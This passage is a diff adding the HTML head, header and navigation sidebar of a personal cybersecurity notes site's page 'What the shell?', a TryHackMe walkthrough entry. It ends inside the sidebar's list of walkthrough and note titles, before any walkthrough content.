@@ -1,0 +1,2918 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A collection of notes and writeups from my journey through cyber security concepts.">
+      
+      
+        <meta name="author" content="Nouman Noor">
+      
+      
+        <link rel="canonical" href="https://nanoor.github.io/CyberSec/walkthroughs/thm/whattheshell/">
+      
+      
+        <link rel="prev" href="../vulnversity/">
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.46">
+    
+    
+      
+        <title>What the shell? - CyberSec</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.6f8fc17f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#additional-resources" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="CyberSec" class="md-header__button md-logo" aria-label="CyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CyberSec
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              What the shell?
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1M8 13h8v-2H8zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4a5 5 0 0 0 5-5 5 5 0 0 0-5-5"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../notes/misc/shellstabilisation/" class="md-tabs__link">
+          
+  
+    
+  
+  Notes
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../activedirectorybasics/" class="md-tabs__link">
+          
+  
+    
+  
+  Walkthroughs
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="CyberSec" class="md-nav__button md-logo" aria-label="CyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>
+
+    </a>
+    CyberSec
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Notes
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Misc
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Misc
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/misc/shellstabilisation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shell Stabilisation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Network
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Network
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/network/dns/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/network/osimodel/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OSI Model
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Privilege Escalation (Linux)
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Privilege Escalation (Linux)
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/crontab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cron Jobs
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/passwdshadow/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Passwd/Shadow File
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/pathvariable/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Path Variable
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/suid/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SUID
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Walkthroughs
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Walkthroughs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    THM
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            THM
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../activedirectorybasics/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory Basics
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Advent of Cyber 2022
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Advent of Cyber 2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day1/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 1 - Frameworks
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 2 - Log Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day3/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 3 - OSINT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 4 - Scanning
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 5 - Brute Force
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 6 - Email Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 7 - Cyber Chef
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 8 - Smart Contracts
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day9/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 9 - Pivoting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day10/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 10 - Hack a Game
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day11/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 11 - Memory Forensics
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day12/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 12 - Malware Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day13/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 13 - Packet Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day14/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 14 - Web Applications
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day15/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 15 - Secure Coding (Securing File Upload)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day16/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 16 - Secure Coding (SQLi)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day17/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 17 - Secure Coding (Regular Expressions)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day18/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 18 - Sigma
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day19/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 19 - Hardware Hacking
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day20/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 20 - Firmware Reverse Engineering
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day21/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 21 - MQTT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../authenticationbypass/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Authentication Bypass
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../basicpentesting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Basic Pentesting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
